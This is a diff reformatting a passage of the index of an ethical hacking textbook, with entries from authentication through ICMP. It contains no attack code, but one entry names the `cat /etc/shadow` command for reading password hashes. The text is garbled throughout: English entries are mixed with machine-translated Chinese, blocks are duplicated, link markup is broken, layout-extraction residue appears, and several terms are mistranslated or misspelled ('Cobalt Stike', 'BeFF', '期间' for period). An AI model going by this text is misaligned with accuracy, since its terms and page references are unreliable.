-    -   [无线社交工程和，] 460
--   [Diffie、Whitfield，] 235–236, 554
--   [Diffie‑Hellman 算法，] 235–236, 553–555
--   [`dig`，] 135–136
--   [目录遍历，] 522–523
--   [反汇编，] 354–356
--   [发现阶段，] 11, 74
--   [离散安全属性，] 586
--   [磁盘加密，] 572–575
--   [分布式拒绝服务 (DDoS)，] 528–529
--   [分布式网络协议 (DNP)，] 153
--   [distributed.net 项目，] 624
--   [DLL (动态链接库)，] 326, 350
--   [`dm‑crypt`，] 575
--   [DMZ (非军事区)，] 44–45, 88, 89, 539, 654
--   [DNP (分布式网络协议)，] 153
--   [DNS (域名系统)] 
-    -   [关于，] 3–4, 75, 129–130
-    -   [名称查找，] 130–136
-    -   [被动 DNS，] 138–142
-    -   [伪造，] 422–424
-    -   [区域传输，] 136–138
--   [DNS 放大攻击，] 528
--   [DNS 安全扩展 (DNSSEC)，] 107, 427
--   [`dnsrecon`，] 137–138
--   [文档对象模型 (DOM)，] 147, 517, 518
--   [域名，] 397
--   [Domain Name System (DNS)] 
-    -   [关于，] 3–4, 75, 129–130
-    -   [名称查找，] 130–136
-    -   [被动 DNS，] 138–142
-    -   [伪造，] 422–424
-    -   [区域传输，] 136–138
--   [域名注册商，] 105–109
--   [DomainMonger，] 106
--   [dork (Google)，] 150
--   [DoS (拒绝服务) 攻击] 
-    -   [关于，] 64, 526
-    -   [带宽攻击，] 527–529
-    -   [老旧，] 531
-    -   [慢速攻击，] 529–530
--   点分十进制表示。*See* [期间 (.)
--   点分四十进制。*See* [期间 (.)
--   [双连字符 (‑‑)，] 520
--   [DPI (深度包检查)，] 78–79
--   [加密驱动，] 573
--   [dropper，] 347–348
--   [DROWN (使用过时且弱化的 RSA 加密)，] 181
--   [`dsniff`，] 419
--   [DuckDuckGo，] 112–114
--   [DVWA (Damn Vulnerable Web Application)，] 521
--   [`DYLD_INSERT_LIBRARIES` 变量，] 329
--   [动态分析] 
-    -   [关于，] 361
-    -   [Cuckoo Sandbox，] 362–366
-    -   [调试，] 366–370
--   [Dynamic Host Configuration Protocol (DHCP)] 
-    -   [饥饿攻击，] 424–426
-    -   [无线社交工程和，] 460
--   [dynamic link library (DLL)，] 326, 350
--   [EBCDIC (Extended Binary Coded Decimal Interchange Code)，] 21
--   [EC2 (Elastic Compute Cloud)，] 49
--   [ECC (椭圆曲线密码学)，] 560–562
--   [EC‑Council，] 2, 522
--   [EDGAR，] 104–105
--   [EDR (端点检测与响应)] 
-    -   [关于，] 84–85, 385, 604
-    -   [规避和，] 313
--   [802.11 标准，] 472–473
--   [Elastic Compute Cloud (EC2)，] 49
--   [Elastic Kubernetes Service (EKS)，] 593
--   [Elastic Stack (ELK stack)，] 86, 329, 541
--   [ELF (Executable and Linkable Format) 文件，] 378
--   [Elk Cloner，] 342
--   [椭圆曲线密码学 (ECC)，] 560–562
--   [Empire，] 307
--   [编码负载，] 380
--   [加密驱动，] 573
--   [加密] 
-    -   [基础，] 551–555
-
-
-
--   `disk/file`, 572–575
-
--   `Wi‑Fi`, 478–483
-
--   `encryptors`, in `static analysis`, 351–353
-
--   `endpoint detection and response (EDR)`
-    -   `about`, 84–85, 385, 604
-
-    -   `evasion and`, 313
-
--   `entity-relationship diagram`, 590–591
-
--   `enumeration`
-    -   `about`, 232–233, 272–273
-
-    -   `answers to review questions`, 672–674
-
-    -   in `ethical hacking`, 12–13
-
-    -   `remote procedure call (RPC)`, 236–242
-
-    -   `review questions`, 274–277
-
-    -   `Server Message Block (SMB)`, 242–257
-
-    -   `service enumeration`, 233–236
-
-    -   `Simple Mail Transfer Protocol (SMTP)`, 260–264
-
-    -   `Simple Network Management Protocol (SNMP)`, 258–260
-
-    -   `web-based enumeration`, 264–271
-
--   `Escalate Privileges` stage, in `life cycle`, 9, 536
-
--   `ESSID`, 491
-
--   `Establish Foothold` stage, in `life cycle`, 9, 536
-
--   `EternalBlue`, 346
-
--   `ethical hacking`
-    -   `about`, 5–6
-
-    -   `methodology of`, 12–15
-
--   `ethics`, 2–5
-
--   `Ettercap`, 420–421, 422–424, 426
-
--   `evasion techniques`
-    -   `about`, 214–220, 313–314
-
-    -   for `applications`, 535–536
-
-    -   with `nmap`, 221–223
-
--   `Event Viewer`, clearing in `Meterpreter`, 329
-
--   `evil twin`, 491–493
-
--   `Executable and Linkable Format (ELF) file`, 378
-
--   `Execution` stage, in `MITRE ATT&CK framework`, 10, 73
-
--   `Exfiltration` stage, in `MITRE ATT&CK framework`, 11, 75
-
--   `Exploitation` stage, in `Lockheed Martin Cyber Kill Chain`, 602
-
--   ``exploit-db``, 281–285, 290–292
-
--   `exploits`
-    -   `defined`, 291
-
-    -   `searching for`, 281–285
-
--   `Express library`, 383–384
-
--   `Extended Binary Coded Decimal Interchange Code (EBCDIC)`, as a `Presentation layer protocol`, 21
-
--   `eXtensible Markup Language (XML)`
-    -   `about`, 597, 635
-
-    -   `external entity processing`, 515–516
-
-    -   `format`, 183, 308–313
+- review questions, `review questions`, 543–548
+- slow, `slow`, 529–530
+- web application attacks, `web application attacks`, 512–526
+- Wi‑Fi, `Wi‑Fi`, 484–495
+- auditing, `auditing`, 93–95
+- authentication
+  - failures of, as one of OWASP top ten vulnerabilities, `failures of`, 514–515
+  - service enumeration and, `service enumeration and`, 236
+  - Wi‑Fi, `Wi‑Fi`, 477–478
+- authenticity, in Parkerian hexad, `authenticity`, 65
+- authority
+  - defined, `defined`, 562
+  - in theory of influence, `in theory of influence`, 437
+- authorized entities, `authorized entities`, 4
+- automating
+  - malware analysis, `malware analysis`, 370–371
+  - social engineering, `social engineering`, 461–464
+- `autoroute` module, `autoroute module`, 321–322
+- availability, in CIA triad, `availability`, 64
+- avoidance, of risk, `avoidance`, 69
+- AWS (Amazon Web Services), `AWS`, 49, 593–594, 616, 633, 639, 641
+- Azure Active Directory, `Azure Active Directory`, 622–623
+- Background Intelligent Transfer Service (BITS), `Background Intelligent Transfer Service (BITS)`, 325–326
+- badge access, `badge access`, 442–444
+- baiting, `baiting`, 447–448
+- bandwidth attacks, `bandwidth attacks`, 527–529
+- base service set identifier (BSSID), `base service set identifier (BSSID)`, 458–459, 477, 490
+- Beacon (Cobalt Stike), `Beacon (Cobalt Stike)`, 384
+- BeFF (Browser Exploitation Framework), `BeFF`, 492–493
+- Bell‑LaPadula model, `Bell‑LaPadula model`, 586
+- Berkeley Packet Filter (BPF), `Berkeley Packet Filter (BPF)`, 408–410
+- Berkeley Software Distribution (BSD), `Berkeley Software Distribution (BSD)`, 396
+- Biba, Kenneth, `Biba, Kenneth`, 585
+- Biba model, `Biba model`, 585
+- biometrics, `biometrics`, 445–446
+- birthday paradox, `birthday paradox`, 296, 569
+- BitLocker, `BitLocker`, 574
+- BITS (Background Intelligent Transfer Service), `BITS`, 325–326
+- black boxes, `black boxes`, 591
+- black hat, `black hat`, 4
+- black‑box testing, `black‑box testing`, 638
+- Blaster, `Blaster`, 343
+- blog storage, `blog storage`, 620
+- bluebugging, `bluebugging`, 498–499
+- bluedump, `bluedump`, 499
+- bluejacking, `bluejacking`, 498
+- bluesmack, `bluesmack`, 499
+- bluesnarfing, `bluesnarfing`, 498
+- Bluetooth
+  - about, `about`, 495–496
+  - bluebugging, `bluebugging`, 498–499
+  - bluedump, `bluedump`, 499
+  - bluejacking, `bluejacking`, 498
+  - bluesmack, `bluesmack`, 499
+  - bluesnarfing, `bluesnarfing`, 498
+  - scanning, `scanning`, 496–498
+- botnet, `botnet`, 344
+- BPF (Berkeley Packet Filter), `BPF`, 408–410
+- bring your own device (BYOD), `bring your own device (BYOD)`, 483–484
+- Broadcom, `Broadcom`, 487
+- Browser Exploitation Framework (BeFF), `Browser Exploitation Framework (BeFF)`, 492–493
+- brute force zone transfers, `brute force zone transfers`, 137–138
+- `brute_dirs` module, `brute_dirs module`, 265
+- BSD (Berkeley Software Distribution), `BSD`, 396
+- BSSID (base service set identifier), `BSSID`, 458–459, 477, 490
+- `btscanner` program, `btscanner program`, 496–497
+- buffer overflow, `buffer overflow`, 532–534
+- built‑in utilities, `built‑in utilities`, 243–247
+- Burp Suite, `Burp Suite`, 636–637
+- bus network, `bus network`, 24–25
+- Business Logic layer, in n‑tier application design, `Business Logic layer`, 590
+- BYOD (bring your own device), `BYOD`, 483–484
+- bytes, `bytes`, 34, 564
+- C, Python compared with, `C`, 372–374
+- CA (certificate authority), `CA`, 562–568
+- cacheability, of applications, `cacheability`, 635
+- caching DNS, `caching DNS`, 132
+- CAM (content‑addressable memory), `CAM`, 30–31
+- canonical name (CNAME) records, `canonical name (CNAME) records`, 132, 138
+- captive portal, `captive portal`, 459
+- Cascading Style Sheets (CSS), `Cascading Style Sheets (CSS)`, 517
+- `cat` command, `cat command`, 522
+- `cat /etc/shadow` command, `cat /etc/shadow command`, 295
+- catastrophizing, `catastrophizing`, 67
+- CBC (Cipher Block Chaining), `CBC`, 557
+- C&C (command‑and‑control infrastructure), `C&C`, 344, 382–383
+- CDIs (Constrained Data Items), 587
+- Censys.io, 646
+- certificate authority (CA), 562–568
+- certificate revocation lists (CRLs), 565
+- certificates, 562
+- certification rules (CRs), 587
+- CGI (common gateway interface) model, 523–524
+- ChaCha20, 236
+- Chaos Computer Club, 8
+- Checksum field, 33, 39
+- CIA triad
+  - about, 61
+  - availability, 64
+  - confidentiality, 61–62
+  - integrity, 63–64
+  - Parkerian hexad, 65
+- Cialdini, Robert, 436–437
+- CIDR (Classless Inter‑Domain Routing) notation, 36, 169
+- CIFS (Common Internet File System), 13
+- CIM (computer‑integrated manufacturing), 654
+- Cipher Block Chaining (CBC), 557
+- ciphersuite, 556–557
+- Cisco, 122
+- Clark‑Wilson Integrity Model, 586–587
+- classification, of data, 582–584
+- Classless Inter‑Domain Routing (CIDR) notation, 36, 169
+- `clearev` command, 329
+- clearing Event Viewer, in Meterpreter, 329
+- client‑server architecture, 634
+- client‑side vulnerabilities, 305–307
+- cloning, 454–457
+- cloud computing
+  - about, 46–47, 612–616, 655–656
+  - answers to review questions, 695–697
+  - architectures, 625–631
+  - cloud services, 616–621
+  - common threats, 639–645
+  - deployment, 631–633
+  - grid computing, 624–625
+  - infrastructure as a service (IaaS), 48–49
+  - Internet of Things (IoT), 53
+  - operational technology, 652–655
+  - platform as a service (PaaS), 49–51
+  - public compared with private cloud, 623
+  - REST, 633–638
+  - review questions, 657–661
+  - shared responsibility model, 621–623
+  - software as a service, 51–53
+  - storage as a service (StaaS), 47–48
+- cloud‑based applications, 593–595
+- CloudFormation, 633
+- cloud‑native design, 629–631
+- CNAME (canonical name) records, 132, 138
+- Cobalt Stike's Beacon, 384
+- Code Red, 343
+- Collection stage, in MITRE ATT&CK framework, 11, 74–75
+- collision, 295–296, 569
+- colon (:), 35
+- Command and Control stage
+  - in Lockheed Martin Cyber Kill Chain, 602
+  - in MITRE ATT&CK framework, 8, 11, 75
+- command injection, 521–522
+- command‑and‑control infrastructure (C&C), 344, 382–383
+- commitment, in theory of influence, 437
+- common gateway interface (CGI) model, 523–524
+- Common Internet File System (CIFS), 13
+- Common Object Request Broker Architecture (CORBA), 237
+- common off‑the‑shelf (COTS) malware, 8
+- Common Vulnerabilities and Exposures (CVE), 181
+- communication models, 19–24
+- companies, open source intelligence (OSI) and, 103–104
+- Complete Mission stage, in life cycle, 10, 536
+- computer‑integrated manufacturing (CIM), 654
+- Confidential classification, 583
+- confidentiality, in CIA triad, 61–62
+- Constrained Data Items (CDIs), 587
+- contact spamming, 452
+- container, 592–593
+- content‑addressable memory (CAM), 30
+- \[分类，\] 582–584
+- \[隐藏，\] 219, 330–332
+- \[完整性，\] 515, 585
+- \[伪造，\] 219
+- \[静态数据，\] 572
+- \[数据泄露，\] 641–642
+- \[数据加密标准 (DES)，\] 555–556
+- \[数据处理，\] 642
+- \[数据层 (n‑tier 应用设计)，\] 590
+- \[数据链路层 (OSI 模型)，\] 22
+- \[数据偏移字段，\] 38
+- \[数据库，\] 595–598
+- \[DDoS (分布式拒绝服务)，\] 528–529
+- \[去认证攻击，\] 489–491
+- \[调试，动态分析和，\] 366–370
+- \[使用过时且弱化的 RSA 加密 (DROWN)，\] 181
+- \[深度包检查 (DPI)，\] 78–79
+- \[防御规避阶段，\] 11, 74
+- \[防御‑在‑深度 方法，\] 89–90, 538–540
+- \[防御‑在‑深度 方法，\] 87–89, 538–540
+- \[可防御的网络架构，\] 90–91, 540–542
+- \[DELETE 方法，\] 631, 635
+- \[传输，\] 8
+- \[传输阶段，\] 602
+- \[非军事区 (DMZ)，\] 44–45, 88, 89, 539, 654
+- \[拒绝服务 (DoS) 攻击\]
+  - \[关于，\] 64, 526
+  - \[带宽攻击，\] 527–529
+  - \[老旧，\] 531
+  - \[慢速攻击，\] 529–530
+- \[部署，云，\] 625–638
+- \[DES (数据加密标准)，\] 555–556
+- \[目标地址字段，\] 33
+- \[目标端口字段，\] 37
+- \[检测函数，\] 600
+- \[检测\]
+  - \[保护和，\] 223–224
+  - \[嗅探器，\] 410–412
+  - \[伪造，\] 426–428
+- \[设备，\] 646
+- \[DevOps，\] 90
+- \[DevSecOps，\] 90
+- \[DHCP (动态主机配置协议)\]
+  - \[饥饿攻击，\] 424–426
+
+
+
+## D
+
+- 无线社交工程和，460
+- Diffie、Whitfield，235–236, 554
+- Diffie‑Hellman 算法，235–236, 553–555
+- `dig`，135–136
+- 目录遍历，522–523
+- 反汇编，354–356
+- 发现阶段，11, 74
+- 离散安全属性，586
+- 磁盘加密，572–575
+- 分布式拒绝服务 (DDoS)，528–529
+- 分布式网络协议 (DNP)，153
+- distributed.net 项目，624
+- DLL (动态链接库)，326, 350
+- `dm‑crypt`，575
+- DMZ (非军事区)，44–45, 88, 89, 539, 654
+- DNP (分布式网络协议)，153
+- DNS (域名系统)
+    - 关于，3–4, 75, 129–130
+    - 名称查找，130–136
+    - 被动 DNS，138–142
+    - 伪造，422–424
+    - 区域传输，136–138
+- DNS 放大攻击，528
+- DNS 安全扩展 (DNSSEC)，107, 427
+- `dnsrecon`，137–138
+- 文档对象模型 (DOM)，147, 517, 518
+- 域名，397
+- Domain Name System (DNS)
+    - 关于，3–4, 75, 129–130
+    - 名称查找，130–136
+    - 被动 DNS，138–142
+    - 伪造，422–424
+    - 区域传输，136–138
+- 域名注册商，105–109
+- DomainMonger，106
+- dork (Google)，150
+- DoS (拒绝服务) 攻击
+    - 关于，64, 526
+    - 带宽攻击，527–529
+    - 老旧，531
+    - 慢速攻击，529–530
+- 点分十进制表示。*See* 期间 (.)
+- 点分四十进制。*See* 期间 (.)
+- 双连字符 (‑‑)，520
+- DPI (深度包检查)，78–79
+- 加密驱动，573
+- dropper，347–348
+- DROWN (使用过时且弱化的 RSA 加密)，181
+- `dsniff`，419
+- DuckDuckGo，112–114
+- DVWA (Damn Vulnerable Web Application)，521
+- `DYLD_INSERT_LIBRARIES` 变量，329
+- 动态分析
+    - 关于，361
+    - Cuckoo Sandbox，362–366
+    - 调试，366–370
+- Dynamic Host Configuration Protocol (DHCP)
+    - 饥饿攻击，424–426
+    - 无线社交工程和，460
+- dynamic link library (DLL)，326, 350
+- EBCDIC (Extended Binary Coded Decimal Interchange Code)，21
+- EC2 (Elastic Compute Cloud)，49
+- ECC (椭圆曲线密码学)，560–562
+- EC‑Council，2, 522
+- EDGAR，104–105
+- EDR (端点检测与响应)
+    - 关于，84–85, 385, 604
+    - 规避和，313
+- 802.11 标准，472–473
+- Elastic Compute Cloud (EC2)，49
+- Elastic Kubernetes Service (EKS)，593
+- Elastic Stack (ELK stack)，86, 329, 541
+- ELF (Executable and Linkable Format) 文件，378
+- Elk Cloner，342
+- 椭圆曲线密码学 (ECC)，560–562
+- Empire，307
+- 编码负载，380
+- 加密驱动，573
+- 加密
+    - 基础，551–555
+- `disk/file`, 572–575
+- `Wi‑Fi`, 478–483
+- `encryptors`, in `static analysis`, 351–353
+- `endpoint detection and response (EDR)`
+    - `about`, 84–85, 385, 604
+    - `evasion and`, 313
+- `entity-relationship diagram`, 590–591
+- `enumeration`
+    - `about`, 232–233, 272–273
+    - `answers to review questions`, 672–674
+    - in `ethical hacking`, 12–13
+    - `remote procedure call (RPC)`, 236–242
+    - `review questions`, 274–277
+    - `Server Message Block (SMB)`, 242–257
+    - `service enumeration`, 233–236
+    - `Simple Mail Transfer Protocol (SMTP)`, 260–264
+    - `Simple Network Management Protocol (SNMP)`, 258–260
+    - `web-based enumeration`, 264–271
+- `Escalate Privileges` stage, in `life cycle`, 9, 536
+- `ESSID`, 491
+- `Establish Foothold` stage, in `life cycle`, 9, 536
+- `EternalBlue`, 346
+- `ethical hacking`
+    - `about`, 5–6
+    - `methodology of`, 12–15
+- `ethics`, 2–5
+- `Ettercap`, 420–421, 422–424, 426
+- `evasion techniques`
+    - `about`, 214–220, 313–314
+    - for `applications`, 535–536
+    - with `nmap`, 221–223
+- `Event Viewer`, clearing in `Meterpreter`, 329
+- `evil twin`, 491–493
+- `Executable and Linkable Format (ELF) file`, 378
+- `Execution` stage, in `MITRE ATT&CK framework`, 10, 73
+- `Exfiltration` stage, in `MITRE ATT&CK framework`, 11, 75
+- `Exploitation` stage, in `Lockheed Martin Cyber Kill Chain`, 602
+- `exploit-db`, 281–285, 290–292
+- `exploits`
+    - `defined`, 291
+    - `searching for`, 281–285
+- `Express library`, 383–384
+- `Extended Binary Coded Decimal Interchange Code (EBCDIC)`, as a `Presentation layer protocol`, 21
+- `eXtensible Markup Language (XML)`
+    - `about`, 597, 635
+    - `external entity processing`, 515–516
+    - `format`, 183, 308–313
 
 ## F
 
--   `Face ID (Apple)`, 445
-
--   `Facebook`, 116–119, 618–619
-
--   `facial recognition`, 445
-
--   `false acceptance rates (FARs)`, 446
-
--   `false negative vulnerability`, 191
-
--   `false positive vulnerability`, 191
-
--   `false rejection rates (FRRs)`, 446
-
--   `Farmer, Dan`, 191
-
--   `FARs (false acceptance rates)`, 446
-
--   `FiercePhish`, 451–452
-
--   `file encryption`, 572–575
-
--   `File Transfer Protocol (FTP)`
-    -   `about`, 498
-
-    -   `stateful filtering and`, 77
-
--   `file traversal`, 522–523
-
--   `fileless malware`, 348
-
--   `filesystems`, encrypting, 572
-
--   `FileVault`, 573–574
-
--   `filters`, running `tcpdump` without, 409
-
--   `fingerprint scanning`, 445
-
--   `Firebug`, 147
-
--   `FireEye Labs Advanced Reverse Engineering (FLARE)`, 349, 370–371
-
--   `Firefox`
-    -   `attacks on`, 305–306
-
-    -   `plugins for`, 143–144
-
--   `firewalls`
-    -   `about`, 76
-
-    -   `Application layer`, 79–80
-
-    -   `deep packet inspection (DPI)`, 78–79
-
-    -   `packet filters`, 76–77
-
-    -   `service enumeration and`, 236
-
-    -   `stateful filtering`, 77–78
-
-    -   `unified threat management (UTM)`, 80
-
--   `Flags field`, 33
-
--   `FLARE (FireEye Labs Advanced Reverse Engineering)`, 349, 370–371
-
--   `fog computing`, 651–652
-
--   `footprinting. *See* reconnaissance and footprinting`
-
--   `forced browsing`, 524, 638
-
--   `419 scam`, 440
-
--   `four-way handshake`, 494
-
--   ``fping``, using `MegaPing`, 163–165
-
--   `FQDNs (fully qualified domain names)`, 129–130, 131–133, 135, 152, 454
-
--   `Fragment Offset field`, 33
-
--   `fragmentation`, as an `evasion technique`, 219
-
--   ``fragroute``, 217–218, 219
-
--   `frame`, 395
-
--   `frequency analysis`, 552
-
--   `FRRs (false rejection rates)`, 446
-
--   `FTP (File Transfer Protocol)`
-    -   `about`, 498
-
-    -   `stateful filtering and`, 77
-
--   `full mesh network`, 27–28
-
--   `fully qualified domain names (FQDNs)`, 129–130, 131–133, 135, 152, 454
-
--   `functions`, 627
-
--   `fuzzing`, 308–313
+- `Face ID (Apple)`, 445
+- `Facebook`, 116–119, 618–619
+- `facial recognition`, 445
+- `false acceptance rates (FARs)`, 446
+- `false negative vulnerability`, 191
+- `false positive vulnerability`, 191
+- `false rejection rates (FRRs)`, 446
+- `Farmer, Dan`, 191
+- `FARs (false acceptance rates)`, 446
+- `FiercePhish`, 451–452
+- `file encryption`, 572–575
+- `File Transfer Protocol (FTP)`
+    - `about`, 498
+    - `stateful filtering and`, 77
+- `file traversal`, 522–523
+- `fileless malware`, 348
+- `filesystems`, encrypting, 572
+- `FileVault`, 573–574
+- `filters`, running `tcpdump` without, 409
+- `fingerprint scanning`, 445
+- `Firebug`, 147
+- `FireEye Labs Advanced Reverse Engineering (FLARE)`, 349, 370–371
+- `Firefox`
+    - `attacks on`, 305–306
+    - `plugins for`, 143–144
+- `firewalls`
+    - `about`, 76
+    - `Application layer`, 79–80
+    - `deep packet inspection (DPI)`, 78–79
+    - `packet filters`, 76–77
+    - `service enumeration and`, 236
+    - `stateful filtering`, 77–78
+    - `unified threat management (UTM)`, 80
+- `Flags field`, 33
+- `FLARE (FireEye Labs Advanced Reverse Engineering)`, 349, 370–371
+- `fog computing`, 651–652
+- `footprinting. *See* reconnaissance and footprinting`
+- `forced browsing`, 524, 638
+- `419 scam`, 440
+- `four-way handshake`, 494
+- `fping`, using `MegaPing`, 163–165
+- `FQDNs (fully qualified domain names)`, 129–130, 131–133, 135, 152, 454
+- `Fragment Offset field`, 33
+- `fragmentation`, as an `evasion technique`, 219
+- `fragroute`, 217–218, 219
+- `frame`, 395
+- `frequency analysis`, 552
+- `FRRs (false rejection rates)`, 446
+- `FTP (File Transfer Protocol)`
+    - `about`, 498
+    - `stateful filtering and`, 77
+- `full mesh network`, 27–28
+- `fully qualified domain names (FQDNs)`, 129–130, 131–133, 135, 152, 454
+- `functions`, 627
+- `fuzzing`, 308–313
 
 ## G
 
--   `gait recognition`, 446
-
--   `Generic Routing Encapsulation (GRE) protocol`, 220
-
--   `GET method`, 384, 631, 635
-
--   `Ghidra`, static analysis using, 358–361
-
--   `GoDaddy`, 106
-
--   `Google`, 150–152, 618–619
-
--   `Google Chrome`
-    -   `attacks on`, 305
-
-    -   `plugins for`, 143–144
-
-    -   `trusted third party and`, 566
-
--   `Google Compute`, 639
-
--   `Google dork`, 150
-
--   `Google Drive`, 47, 619
-
--   `Google Hacking Database`, 151–152
-
--   `Google Rapid Response (GRR)`, 85
-
--   `governmental data classifications`, 583
-
--   `GPUs (graphics processing units)`, 625
-
--   `Graham, Robert`, 184
-
--   `Graph API (Facebook)`, 117–118
-
--   `graphics processing units (GPUs)`, 625
-
--   `gray hat`, 4
-
--   `GRE (Generic Routing Encapsulation) protocol`, 220
-
--   `grid computing`, 624–625
-
--   `group temporal key (GTK)`, 480–481
-
--   `GRR (Google Rapid Response)`, 85
-
--   `guidelines, security`, 72
+- `gait recognition`, 446
+- `Generic Routing Encapsulation (GRE) protocol`, 220
+- `GET method`, 384, 631, 635
+- `Ghidra`, static analysis using, 358–361
+- `GoDaddy`, 106
+- `Google`, 150–152, 618–619
+- `Google Chrome`
+    - `attacks on`, 305
+    - `plugins for`, 143–144
+    - `trusted third party and`, 566
+- `Google Compute`, 639
+- `Google dork`, 150
+- `Google Drive`, 47, 619
+- `Google Hacking Database`, 151–152
+- `Google Rapid Response (GRR)`, 85
+- `governmental data classifications`, 583
+- `GPUs (graphics processing units)`, 625
+- `Graham, Robert`, 184
+- `Graph API (Facebook)`, 117–118
+- `graphics processing units (GPUs)`, 625
+- `gray hat`, 4
+- `GRE (Generic Routing Encapsulation) protocol`, 220
+- `grid computing`, 624–625
+- `group temporal key (GTK)`, 480–481
+- `GRR (Google Rapid Response)`, 85
+- `guidelines, security`, 72
 
 ## H
 
--   `hactivists`, `ransomware and`, 346
+- `hactivists`, `ransomware and`, 346
+- `half-open scan`, 169
+- Handshake tools, 492
+- `hashdump` command, 292–293
+- hashing, cryptographic, 569–570
+- Header Length field, 32–33
+- headers, 32–34
+- Health Insurance Portability and Accountability Act (HIPAA), 45
+- heap, 534
+- heap spraying, 534
+- Heartbleed attack, 146
+- heating, ventilation, and cooling (HVAC), 621
+- Hellman, Martin, 235–236, 554
+- HID (human interface device), 652
+- hiding data, 219, 330–332
+- Hierarchical File System (HFS), 330–331
 
--   `half-open scan`, 169
 
 
+- `HIPAA` (Health Insurance Portability and Accountability Act), `[45`](#c02.xhtml#Page_45)
 
+- `HipChat`, `[501`](#c11.xhtml#Page_501)
 
--   Handshake tools, `[492`](#c11.xhtml#Page_492)
--   `hashdump` command, `[292`–`293`](#c07.xhtml#Page_292)–293
--   hashing, cryptographic, `[569`–`570`](#c13.xhtml#Page_569)–570
--   Header Length field, `[32`–`33`](#c02.xhtml#Page_32)–33
--   headers, `[32`–`34`](#c02.xhtml#Page_32)–34
--   Health Insurance Portability and Accountability Act (HIPAA), `[45`](#c02.xhtml#Page_45)
--   heap, `[534`](#c12.xhtml#Page_534)
--   heap spraying, `[534`](#c12.xhtml#Page_534)
--   Heartbleed attack, `[146`](#c04.xhtml#Page_146)
--   heating, ventilation, and cooling (HVAC), `[621`](#c15.xhtml#Page_621)
--   Hellman, Martin, `[235`–`236`, `554`](#c06.xhtml#Page_235)–236, 554
--   HID (human interface device), `[652`](#c15.xhtml#Page_652)
--   hiding data, `[219`, `330`–`332`](#c05.xhtml#Page_219), 330–332
--   Hierarchical File System (HFS), `[330`–`331`](#c07.xhtml#Page_330)–331
--   HIPAA (Health Insurance Portability and Accountability Act), `[45`](#c02.xhtml#Page_45)
--   HipChat, `[501`](#c11.xhtml#Page_501)
--   `HKEY_LOCAL_MACHINE`, `[385`–`386`](#c08.xhtml#Page_385)–386
--   HMI (human‑machine interface), `[652`, `654`](#c15.xhtml#Page_652), 654
--   `host`, name lookups using, `[133`–`134`](#c04.xhtml#Page_133)–134
--   host isolation, `[85`](#c03.xhtml#Page_85)
--   `hostapd` program, `[459`–`460`, `493`](#c10.xhtml#Page_459)–460, 493
--   host‑based IDS, `[80`](#c03.xhtml#Page_80)
--   Hostile Ports, `[185`](#c05.xhtml#Page_185)
--   `hping`, `[211`–`214`](#c05.xhtml#Page_211)–214
--   HTML (Hypertext Markup Language), `[381`, `513`, `614`–`615`](#c08.xhtml#Page_381), 513, 614–615
--   HTTP (Hypertext Transfer Protocol) 
+- `HKEY_LOCAL_MACHINE`, `[385`–`386`](#c08.xhtml#Page_385)–386
 
-    * about, `[75`, `348`, `589`, `614`–`615`, `623`](#c03.xhtml#Page_75), 348, 589, 614–615, 623
+- `HMI` (human‑machine interface), `[652`, `654`](#c15.xhtml#Page_652), 654
 
-    * as an Application layer protocol, `[21`](#c02.xhtml#Page_21)
+- `host`, name lookups using, `[133`–`134`](#c04.xhtml#Page_133)–134
 
-    * Representational State Transfer (REST) and, `[633`–`634`](#c15.xhtml#Page_633)–634
+- host isolation, `[85`](#c03.xhtml#Page_85)
 
--   HTTrack, `[148`–`149`](#c04.xhtml#Page_148)–149
--   human interface device (HID), `[652`](#c15.xhtml#Page_652)
--   human‑machine interface (HMI), `[652`, `654`](#c15.xhtml#Page_652), 654
--   HVAC (heating, ventilation, and cooling), `[621`](#c15.xhtml#Page_621)
--   hybrid cryptosystem, `[559`](#c13.xhtml#Page_559)
--   hybrid topology, `[28`–`29`](#c02.xhtml#Page_28)–29
--   Hypertext Markup Language (HTML), `[381`, `513`, `614`–`615`](#c08.xhtml#Page_381), 513, 614–615
--   Hypertext Transfer Protocol (HTTP) 
+- `hostapd` program, `[459`–`460`, `493`](#c10.xhtml#Page_459)–460, 493
+
+- host‑based IDS, `[80`](#c03.xhtml#Page_80)
+
+- Hostile Ports, `[185`](#c05.xhtml#Page_185)
+
+- `hping`, `[211`–`214`](#c05.xhtml#Page_211)–214
+
+- `HTML` (Hypertext Markup Language), `[381`, `513`, `614`–`615`](#c08.xhtml#Page_381), 513, 614–615
+
+- `HTTP` (Hypertext Transfer Protocol) 
 
     * about, `[75`, `348`, `589`, `614`–`615`, `623`](#c03.xhtml#Page_75), 348, 589, 614–615, 623
 
@@ -14543,125 +15402,147 @@ content‑addressable memory (CAM), [30](#c0><x_0.3219><y_0.6969>><class_Caption
 
     * Representational State Transfer (REST) and, `[633`–`634`](#c15.xhtml#Page_633)–634
 
--   I
+- `HTTrack`, `[148`–`149`](#c04.xhtml#Page_148)–149
 
--   I Love You virus, `[342`, `437`–`438`](#c08.xhtml#Page_342), 437–438
+- human interface device (`HID`), `[652`](#c15.xhtml#Page_652)
 
--   IaaS (infrastructure as a service) 
+- human‑machine interface (`HMI`), `[652`, `654`](#c15.xhtml#Page_652), 654
 
-    * about, `[48`–`49`](#c02.xhtml#Page_48)–49
+- `HVAC` (heating, ventilation, and cooling), `[621`](#c15.xhtml#Page_621)
 
-    * of malware, `[382`–`384`](#c08.xhtml#Page_382)–384
+- hybrid cryptosystem, `[559`](#c13.xhtml#Page_559)
 
--   IaC (infrastructure as code), `[629`, `631`](#c15.xhtml#Page_629), 631
+- hybrid topology, `[28`–`29`](#c02.xhtml#Page_28)–29
 
--   IAM (identity and access management) system, `[603`, `621`, `639`, `654`](#c14.xhtml#Page_603), 621, 639, 654
+- Hypertext Markup Language (`HTML`), `[381`, `513`, `614`–`615`](#c08.xhtml#Page_381), 513, 614–615
 
--   IANA (Internet Assigned Numbers Authority), `[106`, `109`](#c04.xhtml#Page_106), 109
+- Hypertext Transfer Protocol (`HTTP`) 
 
--   IBM `[360`, `612`–`613`](#c08.xhtml#Page_360), 612–613
+    * about, `[75`, `348`, `589`, `614`–`615`, `623`](#c03.xhtml#Page_75), 348, 589, 614–615, 623
 
--   ICANN (Internet Corporation for Assigned Names and Numbers), `[106`](#c04.xhtml#Page_106)
+    * as an Application layer protocol, `[21`](#c02.xhtml#Page_21)
 
--   ICMP (Internet Control Message Protocol), `[41`–`42`, `75`, `527`](#c02.xhtml#Page_41)–42, 75, 527
+    * Representational State Transfer (REST) and, `[633`–`634`](#c15.xhtml#Page_633)–634
 
